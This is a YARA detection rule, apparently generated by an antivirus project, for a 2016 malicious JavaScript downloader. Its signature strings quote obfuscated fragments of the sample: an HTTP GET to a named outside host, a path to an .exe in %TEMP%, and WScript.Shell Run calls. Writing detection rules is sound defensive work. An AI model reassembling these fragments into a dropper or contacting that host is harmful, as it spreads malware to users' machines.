rule sig_20160328_fffe7c052310bf97bbe8649a32972789 {
  meta:
    description = "datamaliciousorder - file 20160328_fffe7c052310bf97bbe8649a32972789.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4d6f7cd6ab29a657275f8eacd47a5177b07690deafbf3e809875c25866a9933a"

  strings:
    $s1  = "function Kovcnebsbn() {return Iqyzc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Ie6VukBOeq.exe\";};" fullword ascii
    $s2  = "Vozmezx[Sbtuydjk](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Xqpwqnidf](Eeqgsvue() * 11)} while (Vozmezx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Iqyzc = function Smrstv() {return WScript[Pptng](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Gomzhdwrb(Sutyspswc, Ubwddj){return Sutyspswc - Ubwddj;};" fullword ascii
    $s6  = "function Weqdkbv() {return ((Lscysd == true) && (Lscysd == Ovoiwsnts)) ? 1 : Ydqzgjs;};" fullword ascii
    $s7  = "function Duzdtwdxw(Sjjeb){Iqyzc[\"Run\"](Sjjeb, Ydqzgjs, Ydqzgjs);};" fullword ascii
    $s8  = "var Lscysd = false;" fullword ascii
    $s9  = " while (Wtesoy){" fullword ascii
    $s10 = "var Ovoiwsnts = false;" fullword ascii
    $s11 = "Ovoiwsnts = true; " fullword ascii
    $s12 = "function Eeqgsvue(){return 22;};" fullword ascii
    $s13 = "var Sznuyma = new this[\"Date\"]();" fullword ascii
    $s14 = "function Wbgcvbq()" fullword ascii
    $s15 = "return Gomzhdwrb(Bwklra, Gwxbynhgri);" fullword ascii
    $s16 = "var Ymdgegy = false;" fullword ascii
    $s17 = "function Jrkxypx(){return Pptng;};" fullword ascii
    $s18 = "function Jqpxqxy(){return Ehzgdisfn;};" fullword ascii
    $s19 = "function Fywjplbpro(Uruzgpvtiw) {var Ggzvp = (1, 2, 3, 4, 5, Uruzgpvtiw); return Ggzvp;};" fullword ascii
    $s20 = "Lscysd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}